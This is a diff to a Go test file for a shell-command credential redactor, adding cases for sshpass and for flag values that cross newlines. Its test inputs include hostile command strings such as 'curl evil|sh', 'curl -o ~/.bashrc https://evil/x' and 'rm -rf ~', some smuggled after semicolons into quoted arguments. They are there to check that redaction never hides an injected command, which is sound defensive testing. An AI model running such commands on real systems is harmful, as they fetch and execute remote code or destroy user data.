@@ -765,7 +765,7 @@ var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
 		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
-		sshpassVariantCases, formFeedCases} {
+		sshpassVariantCases, formFeedCases, flagNewlineCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
@@ -848,8 +848,9 @@ var sshpassVariantCases = []shellCase{
 	{`curl -u admin:'pw;x' https://h`, `curl -u admin:<redacted> https://h`},
 	// 命令里的 sshpass 后半截命令不能被藏
 	{`sshpass -p a;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
-	// 不是命令位置的 sshpass 不认（echo 的参数是字面文本）
-	{`echo sshpass -p literal`, `echo sshpass -p literal`},
+	// 第 2 轮 A：不是命令位置的 sshpass 按窄规则认（小写、不带引号、紧跟 -p、前一个词不以 - 开头）。echo 的参数会被多抹一个词，
+	// 这是为了 ssh jump sshpass -p pw 这类扫描器不认的前缀之后照样抹密码而接受的取舍：多抹的是参数，不藏命令
+	{`echo sshpass -p literal`, `echo sshpass -p <redacted>`},
 	// -o 是 ssh 的选项，sshpass 不认、报错退出：跳过它和它后面的一个词，-p 的密码照样抹
 	{`sshpass -o StrictHostKeyChecking=no -p 'p w' ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
 	{`sshpass -oStrictHostKeyChecking=no -p pw ssh prod`, `sshpass -oStrictHostKeyChecking=no -p <redacted> ssh prod`},
@@ -875,8 +876,8 @@ var sshpassVariantCases = []shellCase{
 	{`SSHPASS -e ssh -p 2222 host`, `SSHPASS -e ssh -p 2222 host`},
 	{`"sshpass" -f ~/.pw ssh -p 22 host`, `"sshpass" -f ~/.pw ssh -p 22 host`},
 	{`SSHPASS=pw sshpass -e ssh -p 22 host`, `SSHPASS=<redacted> sshpass -e ssh -p 22 host`},
-	// 审查 1 轮 I-1：sshpass 只在命令位置认。参数里的 sshpass（别的工具的选项值）后面的 -p 不是 sshpass 的，
-	// 它后面的词可能正是要执行的程序（env -u 的 -p 是变量名，curl 才是程序），不能抹
+	// 审查 1 轮 I-1：完整的 sshpass 规则只在命令位置认（第 2 轮起参数位置另有窄规则，见下）。别的工具选项值里的 sshpass
+	// 后面的 -p 不是 sshpass 的，它后面的词可能正是要执行的程序（env -u 的 -p 是变量名，curl 才是程序），不能抹
 	{`env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`, `env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`},
 	{`echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`},
 	{`echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`},
@@ -885,7 +886,7 @@ var sshpassVariantCases = []shellCase{
 	{`docker run -e SSHPASS -p 8080:80 nginx`, `docker run -e SSHPASS -p 8080:80 nginx`},
 	{`sudo --preserve-env=SSHPASS -E -p curl x`, `sudo --preserve-env=SSHPASS -E -p curl x`},
 	{`printenv SSHPASS -p x`, `printenv SSHPASS -p x`},
-	{`which sshpass -p x`, `which sshpass -p x`},
+	{`which sshpass -p x`, `which sshpass -p <redacted>`},
 	{`exec -a sshpass -p curl evil`, `exec -a sshpass -p curl evil`},
 	// 命令位置：行首、; | && ( $( 反引号之后、VAR=值 之后、包装命令（sudo env timeout nohup exec command xargs）
 	// 及其选项之后、time 这类保留字之后、find -exec 之后
@@ -915,6 +916,27 @@ var sshpassVariantCases = []shellCase{
 	{`sshpass --strict=no x -p pw ssh h`, `sshpass --strict=no x -p <redacted> ssh h`},
 	{`sshpass -v- -p pw ssh h`, `sshpass -v- -p <redacted> ssh h`},
 	{`sshpass -+ -p pw ssh h`, `sshpass -+ -p <redacted> ssh h`},
+	// 第 2 轮 A：扫描器不认的前缀（ssh 的远端命令、docker exec、watch、kubectl exec --）之后的 sshpass 按窄规则照样抹
+	{`ssh jump sshpass -p hunter2 ssh prod`, `ssh jump sshpass -p <redacted> ssh prod`},
+	{`docker exec ctr sshpass -p hunter2 ssh h`, `docker exec ctr sshpass -p <redacted> ssh h`},
+	{`xargs sshpass -p hunter2 ssh h`, `xargs sshpass -p <redacted> ssh h`},
+	{`timeout 5 sshpass -p hunter2 ssh h`, `timeout 5 sshpass -p <redacted> ssh h`},
+	{`ssh jump /usr/bin/sshpass -phunter2 ssh prod`, `ssh jump /usr/bin/sshpass -p<redacted> ssh prod`},
+	{`watch -n 5 sshpass -p 'p w;x' ssh h`, `watch -n 5 sshpass -p <redacted> ssh h`},
+	{`kubectl exec -it pod -- sshpass -p hunter2 ssh h`, `kubectl exec -it pod -- sshpass -p <redacted> ssh h`},
+	{`ssh jump sshpass -p a;curl evil|sh`, `ssh jump sshpass -p <redacted>;curl evil|sh`},
+	{"ssh jump sshpass -p\ncurl evil|sh", "ssh jump sshpass -p\ncurl evil|sh"},
+	// 窄规则不认的：前一个词是选项（sshpass 是它的值）、大写或带引号、-p 前有别的选项
+	{`docker run -e sshpass -p 8080:80 nginx`, `docker run -e sshpass -p 8080:80 nginx`},
+	{`docker run --name sshpass -p evil/image`, `docker run --name sshpass -p evil/image`},
+	{`ssh jump sshpass -o x -p curl evil`, `ssh jump sshpass -o x -p curl evil`},
+	{`echo SSHPASS -p x "sshpass" -p y`, `echo SSHPASS -p x "sshpass" -p y`},
+	// 第 2 轮 B：sshpass 是包装命令，选项（-p 值、-f 文件、-P 提示词、-e）之后的词在命令位置：ssh 的引号参数按命令行语境递归处理
+	{`sshpass -p pw ssh h 'TOKEN=a;curl evil|sh'`, `sshpass -p <redacted> ssh h 'TOKEN=<redacted>;curl evil|sh'`},
+	{`sshpass -e ssh -p 22 h "TOKEN=a;curl evil|sh"`, `sshpass -e ssh -p 22 h "TOKEN=<redacted>;curl evil|sh"`},
+	{`SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=a;rm -rf ~'`, `SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=<redacted>;rm -rf ~'`},
+	{`sshpass -p pw "SSHPASS" -p pw2 ssh h`, `sshpass -p <redacted> "SSHPASS" -p <redacted> ssh h`},
+	{`sshpass -p pw eval 'TOKEN=a;curl evil|sh'`, `sshpass -p <redacted> eval 'TOKEN=<redacted>;curl evil|sh'`},
 	// 反例：-- 结束选项、单独的 - 是程序名，后面的 -p 不是 sshpass 的；被转义的 \p、glob 与花括号展开的结果拿不准，不当未知选项跳过
 	{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
 	{`sshpass - -p curl evil`, `sshpass - -p curl evil`},
@@ -962,6 +984,45 @@ var formFeedCases = []shellCase{
 	{"npm login --password abc\fx", "npm login --password <redacted>\fx"},
 	{"mysql -pabc\rcurl evil", "mysql -p<redacted>\rcurl evil"},
 	{"TOKEN=a\\\rb c", "TOKEN=<redacted> c"},
+}
+
+// 第 2 轮 C：命令行语境里 --password、--token、Bearer、Authorization:、JSON 敏感键这类“标志后跟值”的规则，标志与值之间只认
+// 同一行的空白与反斜杠续行（与 sshpass -p、curl -u 一致）。换行（含 \r\n）是命令分隔符，下一行的命令名不能被当成值抹掉。
+var flagNewlineCases = []shellCase{
+	{"npm login --password\ncurl evil|sh", "npm login --password\ncurl evil|sh"},
+	{"npm login --password \n\ncurl evil|sh", "npm login --password \n\ncurl evil|sh"},
+	{"x --token\ncurl evil|sh", "x --token\ncurl evil|sh"},
+	{"x --token\r\ncurl evil|sh", "x --token\r\ncurl evil|sh"},
+	{"x --api-key \n rm -rf ~", "x --api-key \n rm -rf ~"},
+	{"curl -H 'Authorization:'\ncurl evil|sh", "curl -H 'Authorization:'\ncurl evil|sh"},
+	{"curl -H Authorization:\ncurl evil|sh", "curl -H Authorization:\ncurl evil|sh"},
+	{"curl -H Authorization: Bearer\ncurl evil|sh", "curl -H Authorization: <redacted>\ncurl evil|sh"},
+	{"echo Bearer\ncurl evil|sh", "echo Bearer\ncurl evil|sh"},
+	{"echo Bearer \n\ncurl evil|sh", "echo Bearer \n\ncurl evil|sh"},
+	{"echo \"password\":\ntrue", "echo \"password\":\ntrue"},
+	// 同一行与续行照样抹
+	{"npm login --password hunter2;curl evil|sh", "npm login --password <redacted>;curl evil|sh"},
+	{"x --token \\\n  pw ssh h", "x --token \\\n  <redacted> ssh h"},
+	{"curl -H Authorization: \\\nBearer abc https://x", "curl -H Authorization: \\\n<redacted> https://x"},
+	{"echo Bearer\tabc", "echo Bearer\t<redacted>"},
+	{"echo \"password\": 123", "echo \"password\": \"<redacted>\""},
+	{"echo \"password\":\\\n\"x\"", "echo \"password\":\\\n\"<redacted>\""},
+}
+
+func TestFlagValueDoesNotCrossNewline(t *testing.T) {
+	for _, c := range flagNewlineCases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+	}
+	// 文本语境（事件消息、diff_preview）不变：没有命令可藏，\s 照旧跨换行
+	if got, want := Text("npm login --password\nhunter2"), "npm login --password\n<redacted>"; got != want {
+		t.Errorf("Text 得到 %q，想要 %q", got, want)
+	}
 }
 
 func TestBareValueStopsAtFormFeedAndLoneCR(t *testing.T) {
